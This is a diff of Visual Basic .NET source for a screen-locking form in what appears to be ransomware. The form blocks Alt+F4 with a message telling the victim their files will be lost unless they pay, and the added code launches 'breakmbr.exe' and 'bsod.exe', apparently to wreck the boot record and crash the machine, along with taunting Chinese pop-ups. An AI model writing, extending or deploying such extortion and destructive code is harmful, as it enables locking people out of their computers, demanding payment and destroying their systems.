@@ -1,6 +1,10 @@
-﻿Public Class Form2
+﻿
+
+Public Class Form2
 
     Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+
+
         Dim t As New Threading.Thread(AddressOf block)
         t.Start()
         Dim t2 As New Threading.Thread(AddressOf block2)
@@ -11,7 +15,6 @@
         Label2.Top = (Label2.Parent.Height / 2) - 200
         Label3.Top = (Label2.Parent.Height / 2) + 10
         Label4.Top = (Label2.Parent.Height / 2) + 50
-        Label7.Top = (Label2.Parent.Height / 2) - 220
         TextBox1.Top = (Label2.Parent.Height / 2) + 70
 
         Label5.Top = (Label2.Parent.Height / 2) + 100
@@ -43,7 +46,7 @@
         End If
     End Sub
 
-    
+
     Private Sub Button1_KeyDown(sender As Object, e As KeyEventArgs) Handles Button1.KeyDown
         If e.KeyData = Keys.Alt + Keys.F4 Then
             MessageBox.Show("You Can't Close me" + Environment.NewLine + "If you Close me  you will loose all Your Files" + Environment.NewLine + "So don't be Smart just Pay Money", "You are Fucked", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
@@ -56,5 +59,33 @@
             MessageBox.Show("You Can't Close me" + Environment.NewLine + "If you Close me  you will loose all Your Files" + Environment.NewLine + "So don't be Smart just Pay Money", "You are Fucked", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
             e.Handled = True
         End If
+    End Sub
+
+    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
+
+    End Sub
+
+    Private Sub Label1_Click(sender As Object, e As EventArgs) Handles Label1.Click
+
+    End Sub
+
+    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click
+
+    End Sub
+
+    Private Sub Label4_Click(sender As Object, e As EventArgs) Handles Label4.Click
+
+    End Sub
+
+    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click, Button3.Click
+        MsgBox("我只是一个按钮")
+        MsgBox("点我干嘛")
+        MsgBox("口亨")
+        MsgBox("自己想办法去")
+    End Sub
+
+    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.ClientSizeChanged
+        Shell("breakmbr.exe")
+        Shell("bsod.exe")
     End Sub
 End Class
